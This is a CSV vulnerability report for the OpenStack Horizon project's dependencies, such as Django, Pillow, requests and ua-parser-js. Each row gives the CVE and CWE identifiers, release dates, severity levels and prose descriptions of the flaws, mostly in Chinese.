project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-57833,CWE-89,2025-09-03,<p>Django 是一个流行的 Python Web 开发框架，提供了高效的 ORM（对象关系映射）功能以简化数据库操作。FilteredRelation 是 Django ORM 中的一种功能，用于在查询中定义过滤关联关系。此漏洞（CVE-2025-57833）涉及 FilteredRelation 的列别名处理，因未对输入的列别名进行充分验证而导致攻击者能够通过构造恶意输入绕过列别名的安全校验，从而实现 SQL 注入攻击。攻击者可以利用该漏洞，通过在 QuerySet.annotate() 或 QuerySet.alias() 方法中传递特制的字典（通过 **kwargs 进行字典展开），插入任意 SQL 命令。此漏洞影响 Django 4.2.24 之前版本、5.1.12 之前版本和 5.2.6 之前版本。</p>,2,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-26699,CWE-770,2025-03-06,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.1.7、5.0.13和4.2.20之前版本存在安全漏洞，该漏洞源于django.utils.text.wrap方法和wordwrap模板过滤器在处理非常长的字符串时可能导致拒绝服务攻击。</p>,2,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-56374,CWE-770,2025-01-14,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.1.5版本之前的5.1版本、5.0.11版本之前的5.0版本和4.2.18版本之前的4.2版本存在安全漏洞，该漏洞源于执行IPv6验证时传递的字符串中缺乏上限限制强制执行，可能导致潜在的拒绝服务攻击。</p>,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-48432,CWE-117,2025-06-05,<p>Django 是一个流行的基于 Python 的 Web 应用框架，提供快捷方便的开发方式和整洁的设计准则。此漏洞存在于 Django 版本 5.2（早于 5.2.2）、5.1（早于 5.1.10）和 4.2（早于 4.2.22）中。其原因是内部 HTTP 响应日志记录未对 request.path 进行必要的转义，从而允许远程攻击者通过精心设计的 URL 来操纵日志输出。当日志在终端中查看或由外部系统处理时，可能导致日志注入或伪造。</p>,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-59682,CWE-23,2025-10-01,Django 是一个广泛使用的 Python Web 开发框架，提供了一系列工具用于快速构建安全且可扩展的 Web 应用程序。其中，django.utils.archive.extract() 函数用于处理归档文件解压操作，并被 'startapp --template' 和 'startproject --template' 命令使用。在 Django 版本 4.2（低于 4.2.25）、5.1（低于 5.1.13）以及 5.2（低于 5.2.7）中，该函数存在一个目录遍历漏洞。攻击者可以通过构造含有共享前缀路径的归档文件，绕过目标目录限制，从而写入或修改目标目录外的文件。漏洞的根本原因在于对归档文件的路径验证不严，未能正确过滤和限制路径。,2,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-59681,CWE-89,2025-10-01,Django 是一个流行的 Python Web 框架，主要用于快速开发 Web 应用和服务。其核心组件 QuerySet 提供了强大的查询构造功能。漏洞涉及 Django 版本 4.2（低于 4.2.25）、5.1（低于 5.1.13）和 5.2（低于 5.2.7）。在使用 QuerySet 的 annotate()、alias()、aggregate() 和 extra() 方法时，如果传递了精心构造的字典参数（通过字典展开 **kwargs），在 MySQL 和 MariaDB 数据库中可能导致 SQL 注入。这是因为这些方法未对列别名进行充分的校验，从而允许恶意用户通过构造字段名称或别名注入恶意 SQL。,3,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-32873,CWE-770,2025-05-08,Django是一个用于快速开发Web应用的高层次Python框架。该框架中的django.utils.html.strip_tags()函数在处理包含大量不完整HTML标签的输入时可能导致性能下降，从而引发拒绝服务问题。,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2025-64458,CWE-407,2025-11-05,Django 是一个流行的 Python Web 框架，广泛用于开发高效和可扩展的 Web 应用程序。这一漏洞主要影响 Django 框架的 5.1 版本（低于 5.1.14）、4.2 版本（低于 4.2.26）和 5.2 版本（低于 5.2.8）。漏洞的根本原因是 Windows 平台上 Python 的 NFKC 字符归一化功能在处理大量 Unicode 字符时性能较差，导致 `django.http.HttpResponseRedirect`、`django.http.HttpResponsePermanentRedirect` 和 `django.shortcuts.redirect` 方法可能因处理特定构造的输入而受到拒绝服务攻击的影响。攻击者可以利用包含大量 Unicode 字符的输入消耗服务器资源，从而导致服务中断。另外，早期不受支持的 Django 版本（如 5.0.x、4.1.x 和 3.2.x）也可能受到此问题的影响，但尚未经过系统评估。,2,2
openstack_horizon,Pillow,>=9.1.0,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
openstack_horizon,Pillow,>=9.1.0,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
openstack_horizon,Pillow,>=9.1.0,True,CVE-2022-30595,CWE-787,2022-05-17,"Pillow是一款基于Python的图像处理库。
Pillow 9.1.0 版本存在安全漏洞，该漏洞源于在处理TGA文件时存在边界错误。远程攻击者利用该漏洞可以将专门设计的数据传递给应用程序，触发基于堆的缓冲区溢出，并在目标系统上执行任意代码。",2,2
openstack_horizon,Pillow,>=9.1.0,True,,CWE-400,2023-05-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to a segmentation fault when decoding BLP JPEG compressed CMYK data in BGRX mode.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `pillow` to version 9.4.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/commit/3ec8fa614705ae273426d60f994e3b01bb57a69a)
- [Pillow Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.3.0.html#decode-jpeg-compressed-blp1-data-in-original-mode)
",3,0
openstack_horizon,Pillow,>=9.1.0,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
openstack_horizon,Pillow,>=9.1.0,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
openstack_horizon,Pillow,>=9.1.0,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
openstack_horizon,requests,>=2.25.1,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
openstack_horizon,requests,>=2.25.1,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_horizon,requests,>=2.25.1,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
openstack_horizon,async,1.5.2,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
openstack_horizon,eslint,3.0.0,True,,,2021-02-25,A vulnerability was descovered in eslint before 4.18.2. One of the regexes in eslint is vulnerable to catastrophic backtracking.,3,-2
openstack_horizon,shelljs,0.6.1,False,,CWE-269,2022-01-15,"### Impact
Output from the synchronous version of `shell.exec()` may be visible to other users on the same system. You may be affected if you execute `shell.exec()` in multi-user Mac, Linux, or WSL environments, or if you execute `shell.exec()` as the root user.

Other shelljs functions (including the asynchronous version of `shell.exec()`) are not impacted.

### Patches
Patched in shelljs 0.8.5

### Workarounds
Recommended action is to upgrade to 0.8.5.

### References
https://huntr.dev/bounties/50996581-c08e-4eed-a90e-c0bac082679c/

### For more information
If you have any questions or comments about this advisory:
* Ask at https://github.com/shelljs/shelljs/issues/1058
* Open an issue at https://github.com/shelljs/shelljs/issues/new
",3,-2
openstack_horizon,ua-parser-js,0.7.22,False,,,,<p>ua-parser-js 是一个用于检测用户代理字符串的 JavaScript 库，旨在提供用户设备和浏览器的信息。该库存在一个效率低下的正则表达式，导致多项式的执行时间（虽然不是指数级的，但仍然危险）。攻击者可以使用特定的载荷来触发这一问题，执行时间可能超过2.5秒。可以通过 `Regexr` 在线检查相关载荷。两个载荷的比较分别为：载荷1 (https://regexr.com/65o79) 和载荷2 (https://regexr.com/65o7c)。</p>,3,1
openstack_horizon,ua-parser-js,0.7.22,False,,,,<p>ua-parser-js 是一个用 JavaScript 编写的库，旨在分析用户代理字符串并提取浏览器、引擎、操作系统、CPU 和设备信息。该库中的一个正则表达式表现出多项式执行时间，虽然没有呈现指数增长，但仍然存在潜在的安全风险。该漏洞源于在处理正则表达式时未能优化其性能，导致在某些输入情况下可能出现严重的延迟。攻击者可以构造特定的输入字符串，导致正则表达式处理时间显著增长，从而影响应用性能。</p>,3,1
openstack_horizon,ua-parser-js,0.7.22,False,,,,<p>ua-parser-js 是一个用于解析用户代理字符串的 JavaScript 库。该库在处理正则表达式时存在一个低效正则表达式，可能导致多项式执行时间。这种执行时间虽然不是指数级的，但仍然可能对性能造成严重影响。该漏洞的根本原因是正则表达式的设计，使得某些输入情况下执行时间显著增加。攻击者可以利用这一现象，通过构造特定的输入串来导致应用程序在处理这些正则表达式时出现延迟，甚至造成拒绝服务 (DoS)。</p>,3,1
